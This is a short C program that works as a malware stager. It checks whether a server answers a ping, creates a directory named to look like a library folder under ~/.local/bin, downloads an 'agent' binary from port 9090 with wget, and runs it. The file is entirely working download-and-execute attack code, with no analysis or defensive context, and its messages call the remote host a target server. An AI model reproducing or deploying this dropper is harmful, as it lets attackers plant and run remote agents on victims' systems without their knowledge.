 #include <stdio.h>
 #include <stdlib.h>


void start(){
    printf("[!] Running..\n");

    char *server = "127.0.0.1";

    char cmd_1[256];
    
    sprintf(cmd_1,"ping -c 1 %s > /dev/null 2>&1",server); //if ICMP rules are deactived, modify this command with netcat

    int checkServer = system(cmd_1);

    char cmd_2[256];
    char *linuxpath = "~/.local/bin/shared/clib/";


    if (checkServer == 0){
        char cmd[256];
        printf("[OK] Target server is alive.. starting\n");
        sprintf(cmd_2,"mkdir -p %s",linuxpath ); // it creates the directory if doesn't exists
        int md = system(cmd_2);
            sprintf(cmd,"wget -q http://%s:9090/agent -O %sagent",server,linuxpath);
            int getFile = system(cmd);
            if (getFile == 0){
                printf("[OK] successfully got the file!\n");
                char exec[256];

                sprintf(exec,"chmod +x %s/agent && %s/agent",linuxpath,linuxpath);
                int exec_file = system(exec);
            }else{
                printf("[!] Error getting the file\n");
            }
    }
    else{
        printf("[OK] Server is unreacheable\n");
    };
}

 int main(){
    start();
 };